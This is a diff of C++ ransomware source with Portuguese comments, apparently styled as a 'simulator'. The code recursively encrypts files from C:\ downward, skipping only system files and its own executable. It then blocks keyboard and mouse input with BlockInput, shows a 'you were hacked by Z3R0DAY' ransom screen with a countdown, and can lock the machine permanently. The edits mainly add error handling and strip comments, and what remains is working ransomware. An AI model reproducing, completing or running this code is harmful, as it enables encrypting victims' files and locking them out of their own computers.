@@ -61,22 +61,24 @@ public:
     void scanAndProcess(const std::string& targetDir, bool encrypt) {
         if (!fs::exists(targetDir)) return;
 
-        for (auto it = fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied);
-             it != fs::end(it); it++) {
-            try {
-                if (it->is_regular_file()) {
-                    std::string pathStr = it->path().string();
+        try {
+            for (auto it = fs::recursive_directory_iterator(targetDir, fs::directory_options::skip_permission_denied);
+                 it != fs::end(it); ++it) {
+                try {
+                    if (it->is_regular_file()) {
+                        std::string pathStr = it->path().string();
 
-                    if (pathStr.find("Windows") != std::string::npos || 
-                        pathStr.find("simulador.exe") != std::string::npos) continue;
+                        if (pathStr.find("Windows") != std::string::npos || 
+                            pathStr.find("simulador.exe") != std::string::npos) continue;
 
-                    if (pathStr.find(".sys") != std::string::npos || 
-                        pathStr.find(".dll") != std::string::npos) continue;
+                        if (pathStr.find(".sys") != std::string::npos || 
+                            pathStr.find(".dll") != std::string::npos) continue;
 
-                    engine.processFile(it->path(), encrypt);
-                }
-            } catch (...) { continue; }
-        }
+                        engine.processFile(it->path(), encrypt);
+                    }
+                } catch (...) { continue; }
+            }
+        } catch (...) { }
     }
 };
 
@@ -117,9 +119,9 @@ private:
 
 public:
     void renderUI(const RansomwareCore& core) {
-        system("cls"); // Limpa a tela para o efeito de interface
+        system("cls"); 
 
-        // 1. Desenha a Arte ASCII em Vermelho Brilhante
+        // Arte ASCII
         setTextColor(12); // Vermelho Brilhante
         std::cout << "\n\n";
         std::cout << " //                                               \n";
@@ -145,18 +147,17 @@ public:
         std::cout << "        [SISTEMA TOTALMENTE BLOQUEADO]              \n";
         std::cout << "====================================================\n";
         
-        // 2. Mensagem de Alerta
-        setTextColor(12); // Vermelho
+        setTextColor(12); 
         std::cout << "\n    [AVISO: VOCE FOI HACKEADO POR Z3R0DAY]\n";
         
-        setTextColor(7); // Branco
+        setTextColor(7); 
         std::cout << "----------------------------------------------------\n";
         std::cout << "  TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS.       \n";
         std::cout << "  O TEMPO ESTA CORRENDO. NAO TENTE FECHAR O SISTEMA. \n";
         std::cout << "----------------------------------------------------\n";
 
         if (core.getState() == AppState::LOCKED_PERMANENTLY) {
-            setTextColor(4); // Vermelho Escuro
+            setTextColor(4); 
             std::cout << "\n    [!!!] TEMPO ESGOTADO! ACESSO PERMANENTE NEGADO [!!!]\n";
         } else {
             int mins = core.getTime() / 60;
@@ -171,11 +172,9 @@ public:
 
 // --- MÓDULO 6: MAIN (O ORQUESTRADOR FINAL) ---
 int main() {
-    // CONFIGURAÇÃO DO ALVO
-    std::string pastaAlvo = "C:\\"; // Mude para sua pasta de teste primeiro!
+    std::string pastaAlvo = "C:\\"; // Mude para pasta de teste para segurança inicial
     std::string senhaCorreta = "batata";
     
-    // Prioridade máxima para o processo
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
 
     RansomwareCore core;
@@ -187,15 +186,14 @@ int main() {
     std::cout << "Alvo: " << pastaAlvo << "\n";
     std::cout << "Aguarde a preparacao...\n";
 
-    // 1. Inicia a Criptografia
+    // 1. Criptografia
     scanner.scanAndProcess(pastaAlvo, true); 
     std::cout << "[!] Criptografia concluida.\n";
 
-    // 2. Bloqueio de Hardware (Mouse e Teclado)
-    // IMPORTANTE: Rodar como Administrador para o BlockInput funcionar
+    // 2. Bloqueio
     BlockInput(TRUE); 
 
-    // 3. Inicia o Timer em background
+    // 3. Timer
     std::thread timerThread(&RansomwareCore::startTimer, &core);
 
     // 4. Loop de Interface
@@ -219,7 +217,7 @@ int main() {
         if (core.getTime() < 1) break; 
     }
 
-    // 5. Liberação do Hardware
+    // 5. Liberação
     BlockInput(FALSE); 
 
     if (core.getState() == AppState::LOCKED_PERMANENTLY) {
